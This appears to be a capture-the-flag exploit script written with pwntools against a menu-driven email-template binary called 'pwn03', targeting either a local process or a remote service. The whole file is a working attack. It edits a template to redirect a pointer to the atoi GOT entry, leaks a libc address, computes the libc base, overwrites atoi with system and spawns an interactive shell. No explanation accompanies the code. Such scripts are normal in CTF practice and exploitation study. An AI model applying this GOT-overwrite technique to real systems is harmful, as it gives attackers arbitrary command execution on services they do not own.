from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwn03")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn03")
else:
	p = remote("172.16.2.14","10003")
	libc = ELF("./libc.so")
	elf = ELF("./pwn03")

def menu(choice):
	p.sendlineafter("> ",str(choice))

def sm(type_,name,content,index = 0):
	menu(1)
	if type_ == True:
		p.sendlineafter("> ","empty")
	else:
		p.sendlineafter("> ","template")
	if not type_:
		p.sendlineafter("Template index: ",str(index))
	p.sendlineafter("Your email Recver: ",name)
	p.sendlineafter("Email content: ",content)

def addtem(name):
	menu(2)
	p.sendlineafter("Email template sign:\n",name)
	
def edittem(index,name):
	menu(4)
	p.sendlineafter("Template index: ",str(index))
	p.sendlineafter("New email template sign:\n",name)

def show():
	menu(3)

def debugf():
	if debug:
		gdb.attach(p,"b *0x403F9F")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
size = 0x30
addtem("a"*size)
addtem("b"*size)
addtem("c"*size)
show()
sm(False,"a"*size,"b"*size,0)
sm(False,"a"*size,"b"*size,1)
sm(False,"a"*size,"b"*size,2)
payload = p64(0) + p64(0x31) + p64(elf.got["atoi"]) + p64(0x30) + p64(0x30)#+ p64(0x20)[:1]
#payload = "1" * 0x10
edittem(1,payload)
show()
p.recvuntil("ID: 0\n")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["atoi"]
log.success("atoi_addr:" + hex(leak_addr))
log.success("libc_base:" + hex(libc.address))
edittem(0,p64(libc.symbols["system"]))
menu("sh")
p.interactive()
